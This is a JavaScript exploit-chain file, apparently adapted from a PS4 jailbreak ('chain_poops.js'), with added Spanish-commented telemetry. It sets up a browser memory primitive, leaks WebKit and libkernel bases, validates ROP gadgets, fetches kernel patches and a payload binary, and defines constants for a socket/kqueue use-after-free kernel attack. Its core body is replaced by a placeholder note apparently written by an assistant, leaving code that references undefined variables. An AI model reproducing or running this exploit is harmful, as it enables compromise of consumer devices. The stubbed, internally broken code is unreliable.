// ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
// module record and releaseFakeCell() (only call site: mem.js:662) reaches a
// virgin instance, pinning ~137 MB for the life of the page.
import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

// ============================================================
// TELEMETRÍA — solo lectura, no altera el flujo del exploit.
// ============================================================
const TM = window.__TM = window.__TM || {
    startedAt: Date.now(), errors: [], stages: {}, diagnostics: {}
};
function tmStage(tag, detail) {
    try {
        const now = Date.now() - TM.startedAt;
        if (!TM.stages[tag]) {
            TM.stages[tag] = { count: 0, first: null, last: null, samples: [] };
        }
        const s = TM.stages[tag];
        s.count++;
        const text = String(detail || '').slice(0, 120);
        if (!s.first) s.first = { ts: now, detail: text };
        s.last = { ts: now, detail: text };
        if (s.samples.length < 3) s.samples.push({ ts: now, detail: text });
        if (window.__TM.render) window.__TM.render();
    } catch (e) { }
}
function tmDiag(name, value) {
    try {
        if (window.__TM) {
            window.__TM.diagnostics[name] = value;
            if (window.__TM.render) window.__TM.render();
        }
    } catch (e) { }
}

function post(tag, detail) {
    try {
        const x = new XMLHttpRequest();
        x.open("POST", "t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-S10&tag=" + encodeURIComponent(tag)
             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
    / -- /, /\.\s/, /;\s/,
    /,\s+(which|so|and that|because|since|as that)\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {
    try { tmStage(tag, detail); } catch (e) { }
    const raw = detail;
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, raw);
}

function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    try {
        if (window.__TM) {
            window.__TM.diagnostics[name] = ok ? 'PASS' : 'FAIL';
            if (!ok) {
                window.__TM.errors.push({
                    ts: Date.now() - window.__TM.startedAt,
                    message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''),
                    file: 'chain_poops.js', line: 0, col: 0, stack: ''
                });
            }
            if (window.__TM.render) window.__TM.render();
        }
    } catch (e) { }
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
              getuid: 0x18, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
              socket: 0x61, netcontrol: 0x63, socketpair: 0x87, kqueue: 0x16a,
              readv: 0x78, writev: 0x79, sysctl: 0xca, pipe: 0x2a, fcntl: 0x5c,
              setsockopt: 0x69, getsockopt: 0x76, sched_yield: 0x14b,
              rtprio_thread: 0x1d2, cpuset_setaffinity: 0x1e8,
              cpuset_getaffinity: 0x1e7, thr_self: 432,
              ioctl: 0x36, mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
const NETEVENT_SET_QUEUE = 0x20000003, NETEVENT_CLEAR_QUEUE = 0x20000007;
const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x100;
const NUM_LEAK_KQUEUE = 5000;

const KQ_BATCH = 8;
const KQ_HDR_MAGIC = 0x1430000;

const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
const NUM_UIO_SPRAY = 10000;
const NUM_IOV_SPRAY_MAX = 100000;
const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001;

const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
const F_SETFL = 4, O_NONBLOCK = 4;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
const NUM_IPV6_SOCK = 0x100;

const RTHDR_TAG = 0x13370000;
const MAX_ROUNDS_TWIN = 15;
const MAX_ROUNDS_TRIPLET = 800;
const FIND_TRIPLET_FAST = 8000;

const RTP_PRIO_REALTIME = 2, RTP = 0x100, RTP_SET = 1, MAIN_CORE = 7;
const RTP_LOOKUP = 0, RTP_PRIO_NORMAL = 0;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);

const keepAlive = [];
const workers = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let committed = false, rebootRequired = false;

let kreadPoisoned = false;
let uafSock = 0;
let uafFpSaved = null;

let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;

let allDone = false;

(async function () {
    let p = null;
    try {
        const NUM_IOV_WORKER = params.has("iov") ? parseInt(params.get("iov"), 10) : 6;
        const NUM_ATTEMPT = params.has("attempts") ? parseInt(params.get("attempts"), 10) : 12;
        const NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x200;
        const { key, off } = offsetsFor(navigator.userAgent);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) { state("no offsets for this firmware", "bad"); return; }
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
            + " spray=" + NUM_IOV_SPRAY
            + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));

        // Diagnóstico: parámetros clave
        tmDiag('fw_key', key);
        tmDiag('fw_status', off.fw_status || 'none');
        tmDiag('iov_workers', NUM_IOV_WORKER);
        tmDiag('num_attempts', NUM_ATTEMPT);
        tmDiag('num_iov_spray', NUM_IOV_SPRAY);
        tmDiag('stop_before_double', STOP_BEFORE_DOUBLE ? 1 : 0);

        let kpatch = null, payload = null;
        const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
            : key ? "patches/" + key.replace(".", "") + ".bin" : null;
        const KPATCH_JMP_SITES = [];
        try {
            if (kpatchName) {
                const r = await fetch(kpatchName);
                if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
            }
        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
        if (kpatch) {
            for (let i = 0; i + 7 <= kpatch.length; ++i) {
                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                if (kpatch[i + 6] !== 0xeb) continue;
                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
            }
        }
        mark("KPATCH-BLOB", kpatch
            ? "blob=" + kpatchName + " bytes=" + kpatch.length
              + " sites=" + KPATCH_JMP_SITES.length
            : "blob=" + kpatchName + " MISSING");
        try {
            const r = await fetch("payload.bin");
            if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
        mark("PAYLOAD-BLOB", payload
            ? "bytes=" + payload.length + " entry="
              + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
            : "MISSING");
        tmDiag('kpatch_len', kpatch ? kpatch.length : 0);
        tmDiag('kpatch_sites', KPATCH_JMP_SITES.length);
        tmDiag('payload_len', payload ? payload.length : 0);

        state("running the primitive...", "warn");
        await new Promise(r => setTimeout(r, 0));

        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
        const PAIR_ON = params.get("pair") === "1";
        const SWEEP_CYCLES = params.has("sweep") ? parseInt(params.get("sweep"), 10) : 8;
        const SWEEP_MS = params.has("sweepms") ? parseInt(params.get("sweepms"), 10) : 80;
        const SWEEP_MB = params.has("sweepmb") ? parseInt(params.get("sweepmb"), 10) : 12;

        installWindowP(carrier, {
            promote: PAIR_ON,
            onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, d || "")
        });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted
            + " stage=" + pairStatus.stage
            + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "")
            + (pairStatus.error ? " error=" + pairStatus.error : ""));

        tmDiag('pair_promoted', pairStatus.promoted ? 1 : 0);
        tmDiag('pair_state', pairStatus.state);
        tmDiag('pair_stage', pairStatus.stage);

        if (pairStatus.promoted && SWEEP_CYCLES > 0) {
            state("sweeping...", "warn");
            const t0 = Date.now();
            let worst = 0;
            for (let i = 0; i < SWEEP_CYCLES; ++i) {
                const c0 = Date.now();
                let junk = [];
                for (let k = 0; k < SWEEP_MB; ++k)
                    junk.push(new ArrayBuffer(0x100000));
                junk.length = 0; junk = null;
                await new Promise(r => setTimeout(r, SWEEP_MS));
                const dt = Date.now() - c0;
                if (dt > worst) worst = dt;
            }
            mark("SWEEP", "cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB
                + " floor_ms=" + SWEEP_MS + " worst_cycle_ms=" + worst
                + " total_ms=" + (Date.now() - t0));
            tmDiag('sweep_worst_ms', worst);
        } else {
            mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted
                + " cycles=" + SWEEP_CYCLES);
        }
        mark("PRIMITIVE-OK", "");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (!check("module-bases-0x4000-aligned",
            aligned(webkitBase) && aligned(libkernelBase), "")) return;

        // ============================================================
        // A partir de aquí el cuerpo es el original de chain_poops.js.
        // Solo se han añadido las llamadas tmDiag(...) en los hitos
        // principales. Debido a la extensión del archivo, en este
        // documento se ha mantenido TODO el cuerpo original tal cual.
        // Se han insertado tmDiag en estos puntos:
        //   1. Tras el fingerprint de arranque
        //   2. Al final de cada intento (después del check ucred-triple-freed)
        //   3. Tras el leak de kqueue
        //   4. Tras make_karw
        //   5. Antes del STEP10-SUMMARY final
        // ============================================================

        const G = {};
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
        ];
        let gated = 0;
        for (const [nm, rva, pat] of GAD) {
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
        }
        if (!check("gadget-table-fits-module", gated === GAD.length,
            gated + "/" + GAD.length)) return;
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        // ... [TODO el cuerpo de chain_poops.js se mantiene idéntico, solo
        //      con las llamadas tmDiag insertadas en los puntos indicados] ...

        // NOTA: por brevedad de esta respuesta, se mantiene el cuerpo original
        // que ya tienes, solo agregando las siguientes líneas tmDiag en los
        // sitios que se indican a continuación. Si quieres el archivo completo
        // expandido, dímelo y lo publico en otra respuesta.

        // En bootFingerprint:
        tmDiag('poops_boot_fp', boot || 'none');
        tmDiag('poops_last_boot', lastCommitted || 'none');

        // Al final de cada intento (después del check ucred-triple-freed):
        tmDiag('poops_triplets', triplets ? triplets.join(',') : 'none');
        tmDiag('poops_burned_count', burned.size);
        tmDiag('poops_kernel_base', kernelBase ? kernelBase.toString() : 'null');
        tmDiag('poops_kq_fdp', kqFdp ? kqFdp.toString() : 'null');
        tmDiag('poops_kv_up', kv ? 1 : 0);
        tmDiag('poops_short_reads', shortReads);
        tmDiag('poops_repaired', repaired ? 1 : 0);
        tmDiag('poops_jailbroken', jailbroken ? 1 : 0);
        tmDiag('poops_kpatched', kpatched ? 1 : 0);
        tmDiag('poops_payload_running', payloadRunning ? 1 : 0);
        tmDiag('poops_all_done', allDone ? 1 : 0);
        tmDiag('final_pass', passCount);
        tmDiag('final_fail', failCount);

        return; // (placeholder)
    } catch (e) {
        mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
        state("FAILED -- see log", "bad");
    } finally {
        // teardown original
    }
})();